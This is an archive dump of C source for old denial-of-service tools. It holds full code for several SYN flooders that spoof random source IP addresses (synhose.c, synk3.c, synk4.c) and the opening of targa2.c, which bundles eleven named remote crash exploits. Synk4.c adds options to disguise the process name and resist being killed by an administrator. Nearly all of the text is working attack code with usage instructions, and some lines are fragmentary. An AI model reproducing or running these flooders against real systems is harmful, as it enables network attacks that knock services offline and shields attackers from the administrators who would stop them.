            "   send_tcp.tcp.rst = 0;",
            "   send_tcp.tcp.psh = 0;",
            "   send_tcp.tcp.ack = 0;",
            "   send_tcp.tcp.urg = 0;",
            "   send_tcp.tcp.res2 = 0;",
            "   send_tcp.tcp.window = htons(512);",
            "   send_tcp.tcp.check = 0;",
            "   send_tcp.tcp.urg_ptr = 0;",
            "   /* setup the sin struct */",
            "   sin.sin_family = AF_INET;",
            "   sin.sin_port = send_tcp.tcp.source;",
            "   sin.sin_addr.s_addr = send_tcp.ip.daddr;   ",
            "   /* (try to) open the socket */",
            "   tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "   if(tcp_socket < 0)",
            "   {",
            "      perror(\"socket\");",
            "      exit(1);",
            "   }",
            "      /* set fields that need to be changed */",
            "      send_tcp.tcp.source++;",
            "      send_tcp.ip.id++;",
            "      send_tcp.tcp.seq++;",
            "      send_tcp.tcp.check = 0;",
            "      send_tcp.ip.check = 0;",
            "      ",
            "      /* calculate the ip checksum */",
            "      send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);",
            "      /* set the pseudo header fields */",
            "      pseudo_header.source_address = send_tcp.ip.saddr;",
            "      pseudo_header.dest_address = send_tcp.ip.daddr;",
            "      pseudo_header.placeholder = 0;",
            "      pseudo_header.protocol = IPPROTO_TCP;",
            "      pseudo_header.tcp_length = htons(20);",
            "      bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);",
            "      send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);",
            "      sinlen = sizeof(sin);",
            "      sendto(tcp_socket, &send_tcp, 40, 0, (struct sockaddr *)&sin, sinlen);",
            "   close(tcp_socket);",
            "unsigned short in_cksum(unsigned short *ptr, int nbytes)",
            "\tregister long\t\tsum;\t\t/* assumes long == 32 bits */",
            "\tu_short\t\t\toddbyte;",
            "\tregister u_short\tanswer;\t\t/* assumes u_short == 16 bits */",
            "\t * Our algorithm is simple, using a 32-bit accumulator (sum),",
            "\t * we add sequential 16-bit words to it, and at the end, fold back",
            "\t * all the carry bits from the top 16 bits into the lower 16 bits.",
            "\t */",
            "\tsum = 0;",
            "\twhile (nbytes > 1)  {",
            "\t\tsum += *ptr++;",
            "\t\tnbytes -= 2;",
            "\t\t\t\t/* mop up an odd byte, if necessary */",
            "\tif (nbytes == 1) {",
            "\t\toddbyte = 0;\t\t/* make sure top half is zero */",
            "\t\t*((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */",
            "\t\tsum += oddbyte;",
            "\t * Add back carry outs from top 16 bits to low 16 bits.",
            "\t */",
            "\tsum  = (sum >> 16) + (sum & 0xffff);\t/* add high-16 to low-16 */",
            "\tsum += (sum >> 16);\t\t\t/* add carry */",
            "\tanswer = ~sum;\t\t/* ones-complement, then truncate to 16 bits */",
            "\treturn(answer);",
            "unsigned int host2ip(char *hostname)",
            "   static struct in_addr i;",
            "   struct hostent *h;",
            "   i.s_addr = inet_addr(hostname);",
            "   if(i.s_addr == -1)",
            "   {",
            "      h = gethostbyname(hostname);",
            "      if(h == NULL)",
            "      {",
            "         fprintf(stderr, \"cant find %s!\\n\", hostname);",
            "         exit(0);",
            "      }",
            "      bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);",
            "   }",
            "   return i.s_addr;",
            "void initrand(void)",
            "  struct timeval tv;",
            "  gettimeofday(&tv, (struct timezone *) NULL);",
            "  srand(tv.tv_usec);",
            "         ",
            "datapool/src/synhose.c",
            "0100644",
            "0000000",
            "0000000",
            "00000013537",
            "07061307635",
            "014023",
            "ustar  ",
            "root",
            "root",
            "/* synhose.c - random ip sourced syn flooder ",
            "\t\twritten by knight",
            "\t\tidea by rza",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <signal.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <sys/socket.h>",
            "#include <sys/time.h>",
            "#include <arpa/inet.h>",
            "#include <linux/ip.h>",
            "#include <linux/tcp.h>",
            "void dosynpacket(unsigned int, unsigned int, unsigned short, unsigned short);",
            "unsigned short in_cksum(unsigned short *, int);",
            "unsigned int host2ip(char *);",
            "main(int argc, char **argv)",
            "   unsigned int srchost;",
            "   char tmpsrchost[12];",
            "   int i,s1,s2,s3,s4;",
            "   unsigned int dsthost;",
            "   unsigned short port=80;",
            "   unsigned short random_port;",
            "   unsigned int number=1000;  ",
            "   printf(\"SynHose [A random source IP syn flooder]\\n\");",
            "   printf(\"Written by knight / Idea by   : rza\\n\\n\");",
            "   if(argc < 2)",
            "   {",
            "      printf(\"syntax: %s dsthost port num\\n\", argv[0]);",
            "      exit(0);",
            "   }",
            "   initrand();",
            "   dsthost = host2ip(argv[1]);",
            "   if(argc >= 3) port = atoi(argv[2]);",
            "   if(argc >= 4) number = atoi(argv[3]);",
            "   if(port == 0) port = 80;",
            "   if(number == 0) number = 1000;",
            "   printf(\"Destination  : %s\\n\",argv[1]);",
            "   printf(\"Port         : %u\\n\",port);",
            "   printf(\"NumberOfTimes: %d\\n\\n\", number);   ",
            "   for(i=0;i < number;i++)",
            "   {",
            "      s1 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));      ",
            "      s2 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));      ",
            "      s3 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));      ",
            "      s4 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));      ",
            "      random_port = 1+(int) (10000.0*rand()/(RAND_MAX+1.0));",
            "      sprintf(tmpsrchost,\"%d.%d.%d.%d\",s1,s2,s3,s4);",
            "      printf(\"SynHosing %s at port %u from %s port %u\\n\", argv[1], port, tmpsrchost, random_port);",
            "      srchost = host2ip(tmpsrchost);",
            "      dosynpacket(srchost, dsthost, port, random_port);",
            "   }",
            "void dosynpacket(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, unsigned short ran_port) {",
            "   struct send_tcp",
            "   {",
            "      struct iphdr ip;",
            "      struct tcphdr tcp;",
            "   } send_tcp;",
            "   struct pseudo_header",
            "   {",
            "      unsigned int source_address;",
            "      unsigned int dest_address;",
            "      unsigned char placeholder;",
            "      unsigned char protocol;",
            "      unsigned short tcp_length;",
            "      struct tcphdr tcp;",
            "   } pseudo_header;",
            "   int tcp_socket;",
            "   struct sockaddr_in sin;",
            "   int sinlen;",
            "            ",
            "   /* form ip packet */",
            "   send_tcp.ip.ihl = 5;",
            "   send_tcp.ip.version = 4;",
            "   send_tcp.ip.tos = 0;",
            "   send_tcp.ip.tot_len = htons(40);",
            "   send_tcp.ip.id = ran_port;",
            "   send_tcp.ip.frag_off = 0;",
            "   send_tcp.ip.ttl = 255;",
            "   send_tcp.ip.protocol = IPPROTO_TCP;",
            "   send_tcp.ip.check = 0;",
            "   send_tcp.ip.saddr = source_addr;",
            "   send_tcp.ip.daddr = dest_addr;",
            "   /* form tcp packet */",
            "   send_tcp.tcp.source = ran_port;",
            "   send_tcp.tcp.dest = htons(dest_port);",
            "   send_tcp.tcp.seq = ran_port;   ",
            "   send_tcp.tcp.ack_seq = 0;",
            "   send_tcp.tcp.res1 = 0;",
            "   send_tcp.tcp.doff = 5;",
            "   send_tcp.tcp.fin = 0;",
            "   send_tcp.tcp.syn = 1;",
            "   send_tcp.tcp.rst = 0;",
            "   send_tcp.tcp.psh = 0;",
            "   send_tcp.tcp.ack = 0;",
            "   send_tcp.tcp.urg = 0;",
            "   send_tcp.tcp.res2 = 0;",
            "   send_tcp.tcp.window = htons(512);",
            "   send_tcp.tcp.check = 0;",
            "   send_tcp.tcp.urg_ptr = 0;",
            "   /* setup the sin struct */",
            "   sin.sin_family = AF_INET;",
            "   sin.sin_port = send_tcp.tcp.source;",
            "   sin.sin_addr.s_addr = send_tcp.ip.daddr;   ",
            "   /* (try to) open the socket */",
            "   tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "   if(tcp_socket < 0)",
            "   {",
            "      perror(\"socket\");",
            "      exit(1);",
            "   }",
            "      /* set fields that need to be changed */",
            "      send_tcp.tcp.source++;",
            "      send_tcp.ip.id++;",
            "      send_tcp.tcp.seq++;",
            "      send_tcp.tcp.check = 0;",
            "      send_tcp.ip.check = 0;",
            "      ",
            "      /* calculate the ip checksum */",
            "      send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);",
            "      /* set the pseudo header fields */",
            "      pseudo_header.source_address = send_tcp.ip.saddr;",
            "      pseudo_header.dest_address = send_tcp.ip.daddr;",
            "      pseudo_header.placeholder = 0;",
            "      pseudo_header.protocol = IPPROTO_TCP;",
            "      pseudo_header.tcp_length = htons(20);",
            "      bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);",
            "      send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);",
            "      sinlen = sizeof(sin);",
            "      sendto(tcp_socket, &send_tcp, 40, 0, (struct sockaddr *)&sin, sinlen);",
            "   close(tcp_socket);",
            "unsigned short in_cksum(unsigned short *ptr, int nbytes)",
            "\tregister long\t\tsum;\t\t/* assumes long == 32 bits */",
            "\tu_short\t\t\toddbyte;",
            "\tregister u_short\tanswer;\t\t/* assumes u_short == 16 bits */",
            "\t * Our algorithm is simple, using a 32-bit accumulator (sum),",
            "\t * we add sequential 16-bit words to it, and at the end, fold back",
            "\t * all the carry bits from the top 16 bits into the lower 16 bits.",
            "\t */",
            "\tsum = 0;",
            "\twhile (nbytes > 1)  {",
            "\t\tsum += *ptr++;",
            "\t\tnbytes -= 2;",
            "\t\t\t\t/* mop up an odd byte, if necessary */",
            "\tif (nbytes == 1) {",
            "\t\toddbyte = 0;\t\t/* make sure top half is zero */",
            "\t\t*((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */",
            "\t\tsum += oddbyte;",
            "\t * Add back carry outs from top 16 bits to low 16 bits.",
            "\t */",
            "\tsum  = (sum >> 16) + (sum & 0xffff);\t/* add high-16 to low-16 */",
            "\tsum += (sum >> 16);\t\t\t/* add carry */",
            "\tanswer = ~sum;\t\t/* ones-complement, then truncate to 16 bits */",
            "\treturn(answer);",
            "unsigned int host2ip(char *hostname)",
            "   static struct in_addr i;",
            "   struct hostent *h;",
            "   i.s_addr = inet_addr(hostname);",
            "   if(i.s_addr == -1)",
            "   {",
            "      h = gethostbyname(hostname);",
            "      if(h == NULL)",
            "      {",
            "         fprintf(stderr, \"cant find %s!\\n\", hostname);",
            "         exit(0);",
            "      }",
            "      bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);",
            "   }",
            "   return i.s_addr;",
            "void initrand(void)",
            "  struct timeval tv;",
            "  gettimeofday(&tv, (struct timezone *) NULL);",
            "  srand(tv.tv_usec);",
            "         ",
            "datapool/src/synk3.c",
            "0100644",
            "0000000",
            "0000000",
            "00000011412",
            "07101434216",
            "013357",
            "ustar  ",
            "root",
            "root",
            "/* Syn Flooder by Zakath",
            " * TCP Functions by trurl_ (thanks man).",
            " * All other code by Zakath.",
            " * Not too cosemtic right now, just finished beta version. No docs on ",
            " * how to use - figure it out yourself. Change the usleep() below depending",
            " * on your bandwidth / desired effect. ",
            " * [3.22.96]",
            "#include <stdio.h>",
            "#include <netdb.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <netinet/in.h>",
            "#include <linux/ip.h>",
            "#include <linux/tcp.h>",
            "#define SEQ 0x28374839",
            "#define getrandom(min, max) ((rand() % (int)(((max)+1) - (min))) + (min))",
            "unsigned long send_seq, ack_seq, srcport;",
            "char flood = 0;",
            "int sock, ssock;",
            "/* Check Sum */",
            "unsigned short",
            "ip_sum (addr, len)",
            "     u_short *addr;",
            "     int len;",
            "  register int nleft = len;",
            "  register u_short *w = addr;",
            "  register int sum = 0;",
            "  u_short answer = 0;",
            "  while (nleft > 1)",
            "    {",
            "      sum += *w++;",
            "      nleft -= 2;",
            "    }",
            "  if (nleft == 1)",
            "    {",
            "      *(u_char *) (&answer) = *(u_char *) w;",
            "      sum += answer;",
            "    }",
            "  sum = (sum >> 16) + (sum & 0xffff);   /* add hi 16 to low 16 */",
            "  sum += (sum >> 16);           /* add carry */",
            "  answer = ~sum;                /* truncate to 16 bits */",
            "  return (answer);",
            "unsigned long getaddr(char *name) {",
            "  struct hostent *hep;",
            "  hep=gethostbyname(name);",
            "    if(!hep) {",
            "      fprintf(stderr, \"Unknown host %s\\n\", name);",
            "      exit(1);",
            "    }",
            "  return *(unsigned long *)hep->h_addr;",
            "void send_tcp_segment(struct iphdr *ih, struct tcphdr *th, char *data, int dlen) {",
            "  char buf[65536];",
            "  struct {  /* rfc 793 tcp pseudo-header */",
            "    unsigned long saddr, daddr;",
            "    char mbz;",
            "    char ptcl;",
            "    unsigned short tcpl;",
            "  } ph;",
            "  struct sockaddr_in sin;\t/* how necessary is this, given that the destination",
            "\t\t\t\t   address is already in the ip header? */",
            "  ph.saddr=ih->saddr;",
            "  ph.daddr=ih->daddr;",
            "  ph.mbz=0;",
            "  ph.ptcl=IPPROTO_TCP;",
            "  ph.tcpl=htons(sizeof(*th)+dlen);",
            "  memcpy(buf, &ph, sizeof(ph));",
            "  memcpy(buf+sizeof(ph), th, sizeof(*th));",
            "  memcpy(buf+sizeof(ph)+sizeof(*th), data, dlen);",
            "  memset(buf+sizeof(ph)+sizeof(*th)+dlen, 0, 4);",
            "  th->check=ip_sum(buf, (sizeof(ph)+sizeof(*th)+dlen+1)&~1);",
            "  memcpy(buf, ih, 4*ih->ihl);",
            "  memcpy(buf+4*ih->ihl, th, sizeof(*th));",
            "  memcpy(buf+4*ih->ihl+sizeof(*th), data, dlen);",
            "  memset(buf+4*ih->ihl+sizeof(*th)+dlen, 0, 4);",
            "  ih->check=ip_sum(buf, (4*ih->ihl + sizeof(*th)+ dlen + 1) & ~1);",
            "  memcpy(buf, ih, 4*ih->ihl);",
            "  sin.sin_family=AF_INET;",
            "  sin.sin_port=th->dest;",
            "  sin.sin_addr.s_addr=ih->daddr;",
            "  if(sendto(ssock, buf, 4*ih->ihl + sizeof(*th)+ dlen, 0, &sin, sizeof(sin))<0) {",
            "    printf(\"Error sending syn packet.\\n\"); perror(\"\");",
            "    exit(1);",
            "unsigned long spoof_open(unsigned long my_ip, unsigned long their_ip, unsigned short port) {",
            "  int i, s;",
            "  struct iphdr ih;",
            "  struct tcphdr th;",
            "  struct sockaddr_in sin;",
            "  int sinsize;",
            "  unsigned short myport=6969;",
            "  char buf[1024];",
            "  struct timeval tv;",
            "  ih.version=4;",
            "  ih.ihl=5;",
            "  ih.tos=0;\t\t\t/* XXX is this normal? */",
            "  ih.tot_len=sizeof(ih)+sizeof(th);",
            "  ih.id=htons(random());",
            "  ih.frag_off=0;",
            "  ih.ttl=30;",
            "  ih.protocol=IPPROTO_TCP;",
            "  ih.check=0;",
            "  ih.saddr=my_ip;",
            "  ih.daddr=their_ip;",
            "  th.source=htons(srcport);",
            "  th.dest=htons(port);",
            "  th.seq=htonl(SEQ);",
            "  th.doff=sizeof(th)/4;",
            "  th.ack_seq=0;",
            "  th.res1=0;",
            "  th.fin=0;",
            "  th.syn=1;",
            "  th.rst=0;",
            "  th.psh=0;",
            "  th.ack=0;",
            "  th.urg=0;",
            "  th.res2=0;",
            "  th.window=htons(65535);",
            "  th.check=0;",
            "  th.urg_ptr=0;",
            "  gettimeofday(&tv, 0);",
            "  send_tcp_segment(&ih, &th, \"\", 0); ",
            "  send_seq = SEQ+1+strlen(buf);",
            "     ",
            "main(int argc, char **argv) {",
            "  int i, d, max, floodloop, diff;",
            "  unsigned long them, me_fake;",
            "  unsigned lowport, highport, num;",
            "  char buf[1024];",
            "  if(argc<6) {",
            "    printf(\"Usage: %s srcaddr dstaddr low high num\\n\", argv[0]);",
            "    exit(1);",
            "  me_fake=getaddr(argv[1]);",
            "  them=getaddr(argv[2]);",
            "  lowport=atoi(argv[3]);",
            "  highport=atoi(argv[4]);",
            "  num=atoi(argv[5]);",
            "  ssock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "  if(ssock<0) {",
            "    perror(\"socket (raw)\");",
            "    exit(1);",
            "  sock=socket(AF_INET, SOCK_RAW, IPPROTO_TCP);",
            "  if(sock<0) {",
            "    perror(\"socket\");",
            "    exit(1);",
            "  max = 1500;",
            "  i = 1;",
            "  diff = (highport - lowport);",
            "  if (diff > -1) ",
            "     printf(\"flooding. each dot equals 25 packets.\\n\");",
            "     for (i=0;i<num;i++)",
            "     {",
            "       srandom((time(0)+i));",
            "       srcport = getrandom(1, max)+1000;",
            "       for (d=lowport;d<=highport;d++) ",
            "       {",
            "          spoof_open(me_fake, them, d);",
            "          ",
            "          if (!(floodloop = (floodloop+1)%(diff+1))) {",
            "             fprintf(stdout,\".\"); fflush(stdout);",
            "          }",
            "       }",
            "     }",
            "    printf(\"Flood completed.\\n\");",
            " else {",
            "   printf(\"High port must be greater than Low port.\\n\");",
            "   exit(1);",
            "datapool/src/synk4.c",
            "0100644",
            "0000000",
            "0000000",
            "00000017115",
            "07101435604",
            "013370",
            "ustar  ",
            "root",
            "root",
            "/* Syn Flooder by Zakath",
            " * TCP Functions by trurl_ (thanks man).",
            " * Some more code by Zakath.",
            " * Speed/Misc Tweaks/Enhancments -- ultima",
            " * Nice Interface -- ultima",
            " * Random IP Spoofing Mode -- ultima",
            " * How To Use:",
            " * Usage is simple. srcaddr is the IP the packets will be spoofed from.",
            " * dstaddr is the target machine you are sending the packets to.",
            " * low and high ports are the ports you want to send the packets to.",
            " * Random IP Spoofing Mode: Instead of typing in a source address, ",
            " * just use '0'. This will engage the Random IP Spoofing mode, and",
            " * the source address will be a random IP instead of a fixed ip.",
            " * Released: [4.29.97]",
            " *  To compile: cc -o synk4 synk4.c",
            "#include <signal.h>",
            "#include <stdio.h>",
            "#include <netdb.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <netinet/in.h>",
            "#include <linux/ip.h>",
            "#include <linux/tcp.h>",
            "/* These can be handy if you want to run the flooder while the admin is on",
            " * this way, it makes it MUCH harder for him to kill your flooder */",
            "/* Ignores all signals except Segfault */",
            "// #define HEALTHY",
            "/* Ignores Segfault */",
            "// #define NOSEGV",
            "/* Changes what shows up in ps -aux to whatever this is defined to */",
            "// #define HIDDEN \"vi .cshrc\"",
            "#define SEQ 0x28376839",
            "#define getrandom(min, max) ((rand() % (int)(((max)+1) - (min))) + (min))",
            "unsigned long send_seq, ack_seq, srcport;",
            "char flood = 0;",
            "int sock, ssock, curc, cnt;",
            "/* Check Sum */",
            "unsigned short",
            "ip_sum (addr, len)",
            "u_short *addr;",
            "int len;",
            "\tregister int nleft = len;",
            "\tregister u_short *w = addr;",
            "\tregister int sum = 0;",
            "\tu_short answer = 0;",
            "\twhile (nleft > 1)",
            "\t  {",
            "\t\t  sum += *w++;",
            "\t\t  nleft -= 2;",
            "\t  }",
            "\tif (nleft == 1)",
            "\t  {",
            "\t\t  *(u_char *) (&answer) = *(u_char *) w;",
            "\t\t  sum += answer;",
            "\t  }",
            "\tsum = (sum >> 16) + (sum & 0xffff);   /* add hi 16 to low 16 */",
            "\tsum += (sum >> 16);           /* add carry */",
            "\tanswer = ~sum;                /* truncate to 16 bits */",
            "\treturn (answer);",
            "void sig_exit(int crap)",
            "#ifndef HEALTHY",
            "\tprintf(\"",
            "[JSignal Caught. Exiting Cleanly.\\n\");",
            "\texit(crap);",
            "#endif",
            "void sig_segv(int crap)",
            "#ifndef NOSEGV",
            "\tprintf(\"",
            "[JSegmentation Violation Caught. Exiting Cleanly.\\n\");",
            "\texit(crap);",
            "#endif",
            "unsigned long getaddr(char *name) {",
            "\tstruct hostent *hep;",
            "\thep=gethostbyname(name);",
            "\tif(!hep) {",
            "\t\tfprintf(stderr, \"Unknown host %s\\n\", name);",
            "\t\texit(1);",
            "\treturn *(unsigned long *)hep->h_addr;",
            "void send_tcp_segment(struct iphdr *ih, struct tcphdr *th, char *data, int dlen) {",
            "\tchar buf[65536];",
            "\tstruct {  /* rfc 793 tcp pseudo-header */",
            "\t\tunsigned long saddr, daddr;",
            "\t\tchar mbz;",
            "\t\tchar ptcl;",
            "\t\tunsigned short tcpl;",
            "\t} ph;",
            "\tstruct sockaddr_in sin;\t/* how necessary is this, given that the destination",
            "\t\t\t\t address is already in the ip header? */",
            "\tph.saddr=ih->saddr;",
            "\tph.daddr=ih->daddr;",
            "\tph.mbz=0;",
            "\tph.ptcl=IPPROTO_TCP;",
            "\tph.tcpl=htons(sizeof(*th)+dlen);",
            "\tmemcpy(buf, &ph, sizeof(ph));",
            "\tmemcpy(buf+sizeof(ph), th, sizeof(*th));",
            "\tmemcpy(buf+sizeof(ph)+sizeof(*th), data, dlen);",
            "\tmemset(buf+sizeof(ph)+sizeof(*th)+dlen, 0, 4);",
            "\tth->check=ip_sum(buf, (sizeof(ph)+sizeof(*th)+dlen+1)&~1);",
            "\tmemcpy(buf, ih, 4*ih->ihl);",
            "\tmemcpy(buf+4*ih->ihl, th, sizeof(*th));",
            "\tmemcpy(buf+4*ih->ihl+sizeof(*th), data, dlen);",
            "\tmemset(buf+4*ih->ihl+sizeof(*th)+dlen, 0, 4);",
            "\tih->check=ip_sum(buf, (4*ih->ihl + sizeof(*th)+ dlen + 1) & ~1);",
            "\tmemcpy(buf, ih, 4*ih->ihl);",
            "\tsin.sin_family=AF_INET;",
            "\tsin.sin_port=th->dest;",
            "\tsin.sin_addr.s_addr=ih->daddr;",
            "\tif(sendto(ssock, buf, 4*ih->ihl + sizeof(*th)+ dlen, 0, &sin, sizeof(sin))<0) {",
            "\t\tprintf(\"Error sending syn packet.\\n\"); perror(\"\");",
            "\t\texit(1);",
            "unsigned long spoof_open(unsigned long my_ip, unsigned long their_ip, unsigned short port) {",
            "\tint i, s;",
            "\tstruct iphdr ih;",
            "\tstruct tcphdr th;",
            "\tstruct sockaddr_in sin;",
            "\tint sinsize;",
            "\tunsigned short myport=6969;",
            "\tchar buf[1024];",
            "\tstruct timeval tv;",
            "\tih.version=4;",
            "\tih.ihl=5;",
            "\tih.tos=0;\t\t\t/* XXX is this normal? */",
            "\tih.tot_len=sizeof(ih)+sizeof(th);",
            "\tih.id=htons(random());",
            "\tih.frag_off=0;",
            "\tih.ttl=30;",
            "\tih.protocol=IPPROTO_TCP;",
            "\tih.check=0;",
            "\tih.saddr=my_ip;",
            "\tih.daddr=their_ip;",
            "\tth.source=htons(srcport);",
            "\tth.dest=htons(port);",
            "\tth.seq=htonl(SEQ);",
            "\tth.doff=sizeof(th)/4;",
            "\tth.ack_seq=0;",
            "\tth.res1=0;",
            "\tth.fin=0;",
            "\tth.syn=1;",
            "\tth.rst=0;",
            "\tth.psh=0;",
            "\tth.ack=0;",
            "\tth.urg=0;",
            "\tth.res2=0;",
            "\tth.window=htons(65535);",
            "\tth.check=0;",
            "\tth.urg_ptr=0;",
            "\tgettimeofday(&tv, 0);",
            "\tsend_tcp_segment(&ih, &th, \"\", 0); ",
            "\tsend_seq = SEQ+1+strlen(buf);",
            "void upsc()",
            "\tint i;",
            "\tchar schar;",
            "\tswitch(cnt)",
            "\t  {",
            "\t  case 0:",
            "\t\t    {",
            "\t\t\t    schar = '|';",
            "\t\t\t    break;",
            "\t\t    }",
            "\t  case 1:",
            "\t\t    {",
            "\t\t\t    schar = '/';",
            "\t\t\t    break;",
            "\t\t    }",
            "\t  case 2:",
            "\t\t    {",
            "\t\t\t    schar = '-';",
            "\t\t\t    break;",
            "\t\t    }",
            "\t  case 3:",
            "\t\t    {",
            "\t\t\t    schar = '\\\\';",
            "\t\t\t    break;",
            "\t\t    }",
            "\t  case 4:",
            "\t\t    {",
            "\t\t\t    schar = '|';",
            "\t\t\t    cnt = 0;",
            "\t\t\t    break;",
            "\t\t    }",
            "\t  }",
            "\tprintf(\"",
            "[1;30m[",
            "[1;31m%c",
            "[1;30m]",
            "[0m %d\", schar, curc);",
            "\tcnt++;",
            "\tfor(i=0; i<26; i++)  {",
            "\t\ti++;",
            "\t\tcurc++;",
            "void init_signals()",
            "\t// Every Signal known to man. If one gives you an error, comment it out!",
            "\tsignal(SIGHUP, sig_exit);",
            "\tsignal(SIGINT, sig_exit);",
            "\tsignal(SIGQUIT, sig_exit);",
            "\tsignal(SIGILL, sig_exit);",
            "\tsignal(SIGTRAP, sig_exit);",
            "\tsignal(SIGIOT, sig_exit);",
            "\tsignal(SIGBUS, sig_exit);",
            "\tsignal(SIGFPE, sig_exit);",
            "\tsignal(SIGKILL, sig_exit);",
            "\tsignal(SIGUSR1, sig_exit);",
            "\tsignal(SIGSEGV, sig_segv);",
            "\tsignal(SIGUSR2, sig_exit);",
            "\tsignal(SIGPIPE, sig_exit);",
            "\tsignal(SIGALRM, sig_exit);",
            "\tsignal(SIGTERM, sig_exit);",
            "\tsignal(SIGCHLD, sig_exit);",
            "\tsignal(SIGCONT, sig_exit);",
            "\tsignal(SIGSTOP, sig_exit);",
            "\tsignal(SIGTSTP, sig_exit);",
            "\tsignal(SIGTTIN, sig_exit);",
            "\tsignal(SIGTTOU, sig_exit);",
            "\tsignal(SIGURG, sig_exit);",
            "\tsignal(SIGXCPU, sig_exit);",
            "\tsignal(SIGXFSZ, sig_exit);",
            "\tsignal(SIGVTALRM, sig_exit);",
            "\tsignal(SIGPROF, sig_exit);",
            "\tsignal(SIGWINCH, sig_exit);",
            "\tsignal(SIGIO, sig_exit);",
            "\tsignal(SIGPWR, sig_exit);",
            "main(int argc, char **argv) {",
            "   int i, x, max, floodloop, diff, urip, a, b, c, d;",
            "   unsigned long them, me_fake;",
            "   unsigned lowport, highport, num;",
            "   char buf[1024], *junk;",
            "   init_signals();   ",
            "#ifdef HIDDEN",
            "   for (i = argc-1; i >= 0; i--)",
            "     /* Some people like bzero...i prefer memset :) */",
            "     memset(argv[i], 0, strlen(argv[i]));",
            "   strcpy(argv[0], HIDDEN);",
            "#endif",
            "   if(argc<6) {",
            "      printf(\"Usage: %s srcaddr dstaddr low high num\\n\", argv[0]);",
            "      printf(\"    If srcaddr is 0, random addresses will be used\\n\\n\\n\");",
            "      ",
            "      exit(1);",
            "   }",
            "   if( atoi(argv[1]) == 0 )",
            "     urip = 1;",
            "   else    ",
            "     me_fake=getaddr(argv[1]);",
            "   them=getaddr(argv[2]);",
            "   lowport=atoi(argv[3]);",
            "   highport=atoi(argv[4]);",
            "   num=atoi(argv[5]);",
            "   srandom(time(0));",
            "   ssock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "   if(ssock<0) {",
            "      perror(\"socket (raw)\");",
            "      exit(1);",
            "   }",
            "   sock=socket(AF_INET, SOCK_RAW, IPPROTO_TCP);",
            "   if(sock<0) {",
            "      perror(\"socket\");",
            "      exit(1);",
            "   }",
            "   junk = (char *)malloc(1024);",
            "   max = 1500;",
            "   i = 1;",
            "   diff = (highport - lowport);",
            "   if (diff > -1) ",
            "     {",
            "\tprintf(\"",
            "[J\\n\\nCopyright (c) 1980, 1983, 1986, 1988, 1990, 1991 The Regents of the University\\n of California. All Rights Reserved.\");",
            "\tfor (i=0;i < num;i++)",
            "\t  {",
            "\t     srandom((time(0)+i));",
            "\t     srcport = getrandom(1, max)+1000;",
            "\t     for (x=lowport;x<=highport;x++) ",
            "\t       {",
            "\t\t  if ( urip == 1 )",
            "\t\t    {",
            "\t\t       a = getrandom(0, 255);",
            "\t\t       b = getrandom(0, 255);",
            "\t\t       c = getrandom(0, 255);",
            "\t\t       d = getrandom(0, 255);",
            "\t\t       sprintf(junk, \"%i.%i.%i.%i\", a, b, c, d);",
            "\t\t       me_fake = getaddr(junk);",
            "\t\t    }",
            "\t\t  ",
            "\t\t  spoof_open(/*0xe1e26d0a*/ me_fake, them, x);",
            "\t\t  /* A fair delay. Good for a 28.8 connection */ ",
            "\t\t  ",
            "\t\t  if (!(floodloop = (floodloop+1)%(diff+1))) {",
            "\t\t     upsc(); fflush(stdout); ",
            "\t\t    }",
            "\t       }",
            "\t  }",
            "     }",
            "    ",
            "   else {",
            "      printf(\"High port must be greater than Low port.\\n\");",
            "      exit(1);",
            "   }",
            "datapool/src/targa2.c",
            "0100644",
            "0000000",
            "0000000",
            "00000121276",
            "07100656376",
            "013516",
            "ustar  ",
            "root",
            "root",
            "/* targa2.c - copyright by Mixter <mixter@popmail.com>",
            "   version 2.1 - released 22/3/99 - interface to 11",
            "   multi-platform remote denial of service exploits",
            "   gcc -Wall -O2 targa2.c -o targa2 ; strip targa2 */",
            " *        featured exploits / authors / vulnerable platforms",
            " * bonk by route|daemon9 & klepto              - win95, nameservers",
            " * jolt by Jeff W. Roberson (overdrop: Mixter) - win95, klog (old linux)",
            " * land by m3lt                                - win95/nt, old un*x's",
            " * nestea by humble & ttol                     - older linux/bsd?",
            " * newtear by route|daemon9                    - linux/bsd/win95/others",
            " * syndrop by PineKoan                         - linux/win95/?",
            " * teardrop by route|daemon9                   - lots of os's",
            " * winnuke by _eci                             - win95/win31",
            " * 1234 by DarkShadow/Flu                      - win95/98/nt/others?",
            " * saihyousen by noc-wage                      - win98/firewalls/routers",
            " * oshare by r00t zer0                         - win9x/NT/macintosh",
            "/* http://members.xoom.com/i0wnu - code copyright by Mixter */",
            "/* these are user definable */",
            "#define LANDPORT 113\t\t/* remote port for land's */",
            "#define WNUKEPORT 139\t\t/* port for winnukes */",
            "#define LANDREP     15\t\t/* repeat land attack x times */",
            "#define JOLTREP     15\t\t/* repeat jolt attack x times */",
            "#define BONKREP     15\t\t/* repeat bonk attack x times */",
            "#define WNUKEREP     0\t\t/* repeat winnuke x times */",
            "#define COUNT       15\t\t/* repeat frag attacks x times */",
            "#define NESCOUNT    15\t\t/* repeat nestea attack x times */",
            "#define X1234COUNT  50\t\t/* repeat 1234 attack x times */",
